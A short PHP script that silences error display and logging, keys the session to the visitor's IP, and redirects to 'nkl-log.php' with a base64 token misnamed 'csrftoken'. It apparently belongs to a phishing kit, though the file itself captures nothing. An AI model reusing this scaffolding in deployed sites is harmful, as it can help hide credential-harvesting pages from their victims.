<?php
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
session_id(md5(getenv('REMOTE_ADDR')));
session_start();





$csrftoken = base64_encode($_SERVER['HTTP_USER_AGENT'] . getenv('REMOTE_ADDR') . date('Y:M:D'));


$DIR = "nkl-log.php?token=". $csrftoken;


header("location:$DIR");


?>
    